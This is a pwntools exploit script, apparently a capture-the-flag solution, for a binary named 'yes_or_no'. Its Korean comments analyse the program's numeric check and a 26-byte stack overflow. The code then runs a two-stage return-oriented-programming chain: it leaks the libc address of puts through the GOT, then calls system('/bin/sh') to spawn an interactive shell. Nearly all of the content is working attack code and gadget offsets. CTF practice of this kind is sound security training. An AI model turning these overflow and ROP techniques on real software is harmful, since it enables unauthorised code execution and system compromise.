# -*- coding: utf-8 -*-
from pwn import * 

#p = process(["./yes_or_no"],env={'LD_PRELOAD':'./libc.so.6'})
p = process("./yes_or_no")


# rbp-0x4 위치에 5가 저장되는데, 이는 뒤에서 비교문에 쓰인다. 
# 프로그램을 실행하면 fgets로 10글자 입력을 받아 rbp-0x12위치에 저장한다. 
# 그 다음 atoi를 수행, 결과값을 rbp-0x12위치에 저장한다. 
# 이후 아까 rbp-0x4에 저장했던 값을 가져와서 -0xa, 오른쪽 3바이트 시프르틀 수행 후
# js (jump on sign/부호플래그가 1이면 점프)에 의한 점프를 진행한다. 
# js 는 test에 쓰이는 인자가 음수면 sign flag 가 1로 세팅되어 점프하는 연산이다.
# 즉, ebp-0x4에 들어갈 값이 -0xa 와 오른쪽 3바이트 시프트가 수행되더라도 양수이면 된다는 이야기. 
# 근데 값을 복사할때 eax로부터 값을 복사하기 때문에 4바이트씩밖에 옮겨가지 않는다. 

# 아무튼 그 다음, 점프한 이후에 rbp-0x8의 값과 0이 같은지 비교해 다르면 점프.
# 점프한 다음 아까 5가 들어갔던 rbp-0x4의 값을 1 더하기 해준다.(6) 
# 그리고 idiv연산을 진행. eax의 값을 rpb-0x4로 나누어 결과를 eax에 저장한다. 
# 이 시점에서 eax에는 4b4(1204) 가 들어있는 상태로 계산이 진행되고,
# 일련의 명령어를 거치면서 rbp-4의 값은 다시 또 1이 더해진다. (7)
# 그 다음, 나머지 연산의 결과(c8/)와 1이 더해지기전 rbp-4의값(6)을 곱하고 
# rbp-4를 또 더한다(8). 그 다음 66666667 과 해당 값을 곱한 결과를 eax에 저장

# 이런식으로 일련의 계산을 거친 후, eax에 들어있는 0x960000(9830400)과 아까 입력한숫자를 같은지 비교한다. 
# 점프 이후엔, 아까 3이 더해졌던 rbp-4의 값과 rbp-0x12위치의 값이 같은지 비교한다. 
# 만약에 9830400을 입력한다면, 동일 위치에 입력을 한번더 받을 수 있게 된다. 
# 8을 입력한다면 , 그냥 프로그램이 끝난다. 
# 즉, 9830400 입력한 이후에 오버플로우를 일으켜 흐름을 조작시켜야 되는듯. 

# 여기서, 문제에서 힌트를 주고있다. do_system+1094 위치를 언급하는데 
# 해당 함수는 내부적으로 execve를 호출하는 특성이 있다. 
# 해당 주소는 고정주소가 아니기 때문에 직접적인 점프는 힘들다. 

# 아까 rbp-4의 값을 시프트해서 비교하는 구문으로 점프를 뛰게 해볼까?
# rip 주소 0x7fffffffe3a8, 입력받는 주소 0x7fffffffe38e 이므로 총26바이트 + 주소값. 
# 디버깅을 해보니, 18바이트 + 8 바이트 식으로 입력을 했을 때 
# main함수 종료 후 마지막 8바이트 입력값 주소를 call해주는게 보인다. 
# execve 함수 주소는 0x7ffff7ac8e30
# rtl를 하란 얘기같다. pie는 꺼져있고 relro 는 partial
# puts 로 주소 leak 한다음에 system 함수 주소 가져오는 식으로 해야될거같다. 

puts_plt = 0x400580
puts_got = 0x601018

popret = 0x400648
poprdi = 0x400883

puts_offset = 0x809C0
system_offset = 0x4F440
binsh_offset = 0x1B3E9B

main = 0x04006c7

p.recvuntil("Show")
p.sendlineafter("number~!","9830400")

# 0x7ffe3cf93bfe 부터 입력들어감, 0x7ffe3cf93c18 eip 위치 ,크기 1A(26바이트)
# 26바이트 삽입 후 puts_p + pr + gets_p /  gets_p + pr + bss / system + pr + bss 
# gets 의 주소값 leak 해서 오프셋 계산, libc leak 하고 시스템 offset 더해서 계산.
# 아, binsh 입력해줄 필요가 없었다. libc에 박혀있다.
# 그러면, leak을 한번 하고 다시 메인함수로 돌아가서 두번쨰 rtl을 하게 만들자. 
# 64비트 rtl이다. 인자를 레지스터로, rdi -> rsi -> rdx -> rcx 

payload = "a"*0x1a
payload += p64(poprdi) + p64(puts_got) + p64(puts_plt) + p64(main)  #1. leak stage

p.sendlineafter("me",payload)
print p.recvline()
recv = p.recv().strip()
leak = u64(recv+"\x00"*(8-len(recv)))
libc = leak - puts_offset

log.info(hex(leak))

system = libc+system_offset
binsh = libc+binsh_offset
log.info("system : "+hex(system)+",binsh : "+hex(binsh))

p.sendline("9830400")

pause()
payload2 = "b"*0x1a
payload2 += p64(poprdi) + p64(binsh) + p64(system)  #2. call system(/bin/sh)
p.recvline()
pause()
p.sendline(payload2)


p.interactive()


